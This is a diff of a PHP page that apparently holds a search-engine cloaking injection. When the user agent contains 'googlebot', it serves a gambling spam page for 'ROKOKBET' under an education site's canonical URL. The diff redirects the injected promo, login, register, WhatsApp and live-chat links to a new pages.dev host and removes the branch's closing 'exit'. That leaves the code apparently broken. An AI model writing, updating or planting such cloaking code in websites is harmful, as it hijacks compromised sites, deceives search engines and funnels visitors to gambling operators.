@@ -9,10 +9,10 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
 	<meta name="viewport" content="width=device-width,initial-scale=1">
 	<link rel="canonical" href="https://pcpendidikan.org/ ">
-	<link rel="amphtml" href="https://pcpendidikan.netlify.app/ ">
-	<link rel="alternate" hreflang="id-id" href="https://pcpendidikan.netlify.app/ ">
-	<link rel="alternate" hreflang="id" href="https://pcpendidikan.netlify.app/ ">
-	<link rel="alternate" hreflang="x-default" href="https://pcpendidikan.netlify.app/ ">
+	<link rel="amphtml" href="https://nangboi.pages.dev/ ">
+	<link rel="alternate" hreflang="id-id" href="https://nangboi.pages.dev/ ">
+	<link rel="alternate" hreflang="id" href="https://nangboi.pages.dev/ ">
+	<link rel="alternate" hreflang="x-default" href="https://nangboi.pages.dev/ ">
 	<meta name="robots" content="index, follow">
 	<link rel="preconnect" href="https://cdn.shopify.com" crossorigin="">
 	<link rel="preconnect" href="https://fonts.shopifycdn.com" crossorigin="">
@@ -2338,7 +2338,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                               &nbsp; </label>
                            </fieldset>
                            <p>
-                             <a href="https://pcpendidikan.netlify.app/" target="_blank">
+                             <a href="https://nangboi.pages.dev/" target="_blank">
                              <img style="display:block;margin-left:auto;margin-right:auto;" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6LeN0E1eQhClBeHqItT7yJJzDzSR12jl-nAdSQwHwqBr1cjLWeNHP5Ql6yqFwuUbcyoLvu43F6ESkVGW75XR6hNm1DBRtOT49usBljiVPyTnxN6DQe_AKSXqZz-dCVhjWZb2GoxBcTU5TPNxc4E0PjUIDtnwtYk1YYvKMks1tiWoYyZAcIvnEVPJVoafd/s210/logo.png" width="400" height="150">
                              </a>
                            </p>
@@ -3326,23 +3326,23 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
 </style>
 
 <div class="ROKOKBET-fixed-footer">
-    <a href="https://pcpendidikan.netlify.app/" rel="nofollow noopener" target="_blank">
+    <a href="https://nangboi.pages.dev/" rel="nofollow noopener" target="_blank">
         <img layout="intrinsic" height="20px" width="20px" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvAKOWy13LlNC6KysfALg-3IOu0WJGOrE7AGhXnuyfjAxJwQRJZJIvfT5xqThpNuwOhb5Gk6cgxgemRRnV790NLJ-3CoyGVBtDduKyrow4i9ib3_DQszM_LtOz9PvpmYDqUjo3-ovjR1ljLhuP9kLFGOvHlyJf_qTn5W_8HRqMzBvYX2SeM-uLunmGOZF4/s400/favicon.png..png?updatedAt=1758821270689" alt="bonus ROKOKBET">
         PROMO
     </a>
-    <a href="https://pcpendidikan.netlify.app/" rel="nofollow noopener" target="_blank">
+    <a href="https://nangboi.pages.dev/" rel="nofollow noopener" target="_blank">
         <img layout="intrinsic" height="20px" width="20px" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvAKOWy13LlNC6KysfALg-3IOu0WJGOrE7AGhXnuyfjAxJwQRJZJIvfT5xqThpNuwOhb5Gk6cgxgemRRnV790NLJ-3CoyGVBtDduKyrow4i9ib3_DQszM_LtOz9PvpmYDqUjo3-ovjR1ljLhuP9kLFGOvHlyJf_qTn5W_8HRqMzBvYX2SeM-uLunmGOZF4/s400/favicon.png..png?updatedAt=1758821270689" alt="login ROKOKBET">
         LOGIN
     </a>
-    <a href="https://pcpendidikan.netlify.app/" rel="nofollow noopener" target="_blank" class="tada">
+    <a href="https://nangboi.pages.dev/" rel="nofollow noopener" target="_blank" class="tada">
         <img layout="intrinsic" height="20px" width="20px" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvAKOWy13LlNC6KysfALg-3IOu0WJGOrE7AGhXnuyfjAxJwQRJZJIvfT5xqThpNuwOhb5Gk6cgxgemRRnV790NLJ-3CoyGVBtDduKyrow4i9ib3_DQszM_LtOz9PvpmYDqUjo3-ovjR1ljLhuP9kLFGOvHlyJf_qTn5W_8HRqMzBvYX2SeM-uLunmGOZF4/s400/favicon.png..png?updatedAt=1758821270689" alt="daftar ROKOKBET">
         DAFTAR
     </a>
-    <a href="https://pcpendidikan.netlify.app/" rel="nofollow noopener" target="_blank">
+    <a href="https://nangboi.pages.dev/" rel="nofollow noopener" target="_blank">
         <img layout="intrinsic" height="20px" width="20px" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvAKOWy13LlNC6KysfALg-3IOu0WJGOrE7AGhXnuyfjAxJwQRJZJIvfT5xqThpNuwOhb5Gk6cgxgemRRnV790NLJ-3CoyGVBtDduKyrow4i9ib3_DQszM_LtOz9PvpmYDqUjo3-ovjR1ljLhuP9kLFGOvHlyJf_qTn5W_8HRqMzBvYX2SeM-uLunmGOZF4/s400/favicon.png..png?updatedAt=1758821270689" alt="wa ROKOKBET">
         WHATSAPP
     </a>
-    <a href="https://pcpendidikan.netlify.app/" rel="nofollow noopener" target="_blank" class="js_live_chat_link live-chat-link">
+    <a href="https://nangboi.pages.dev/" rel="nofollow noopener" target="_blank" class="js_live_chat_link live-chat-link">
         <img class="live-chat-icon" layout="intrinsic" height="20px" width="20px" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvAKOWy13LlNC6KysfALg-3IOu0WJGOrE7AGhXnuyfjAxJwQRJZJIvfT5xqThpNuwOhb5Gk6cgxgemRRnV790NLJ-3CoyGVBtDduKyrow4i9ib3_DQszM_LtOz9PvpmYDqUjo3-ovjR1ljLhuP9kLFGOvHlyJf_qTn5W_8HRqMzBvYX2SeM-uLunmGOZF4/s400/favicon.png..png?updatedAt=1758821270689" alt="livechat ROKOKBET">
         LIVE CHAT
     </a>
@@ -5588,10 +5588,6 @@ document.querySelectorAll(".cok-faq-q").forEach(btn => {
 </button></div>
 	</div>
 </div></body></html>
-<?php
-exit;
-}
-?>
 <?php
 
 /**
